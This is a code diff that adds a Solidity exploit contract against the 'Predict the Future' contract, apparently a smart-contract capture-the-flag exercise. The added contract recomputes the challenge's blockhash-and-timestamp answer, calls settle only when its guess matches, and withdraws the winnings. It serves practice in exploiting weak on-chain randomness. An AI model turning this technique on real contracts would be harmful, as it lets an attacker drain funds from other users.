@@ -36,3 +36,41 @@ contract PredictTheFutureChallenge {
         }
     }
 }
+
+interface IPredictTheFutureChallenge {
+    function lockInGuess(uint8 n) external payable;
+    function settle() external;
+}
+
+contract PerdictTheFutureExploit {
+    IPredictTheFutureChallenge challenge;
+    uint8 public guess;
+    
+    function PerdictTheFutureExploit(address challengeAddress) public {
+        challenge = IPredictTheFutureChallenge(challengeAddress);
+    }
+
+    function lockInMyGuess(uint8 n) public payable {
+        require(msg.value == 1 ether);
+        guess = n;
+        challenge.lockInGuess.value(1 ether)(n);
+    }
+
+    function tryToSettle() public {
+        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
+        
+        if (answer == guess) {
+            challenge.settle();
+        }
+    }
+
+    function contractBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+
+    function withdraw() public {
+        msg.sender.transfer(address(this).balance);
+    }
+
+    function() public payable {}
+}
